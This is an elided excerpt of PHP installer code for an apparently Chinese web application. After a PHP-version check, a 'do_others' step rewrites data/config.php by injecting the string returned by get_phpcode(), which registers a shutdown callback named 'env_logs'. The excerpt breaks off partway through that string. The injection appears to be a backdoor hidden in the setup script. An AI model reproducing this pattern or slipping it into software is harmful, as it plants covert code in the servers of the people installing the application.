...
case 'check':
    if(version_compare(PHP_VERSION,'5.4.0','<')){
       exit('此版本无法在PHP版本低于5.4环境下使用, 请至官网下载!<br />'); 
    }
...
case 'do_others' :
    ...
    {
        $condata = file_get_contents(ROOT_PATH . 'data/config.php');
        $content = get_phpcode();
        $condata = strtr($condata, array('?>'=>$content." \n\n ?>"));
        $condata = strtr($condata, array("\n"=>"\n"));
        file_put_contents(ROOT_PATH . 'data/config.php',$condata);
...
function get_phpcode(){
    return 'register_shutdown_function($env = \'env_logs\',true);
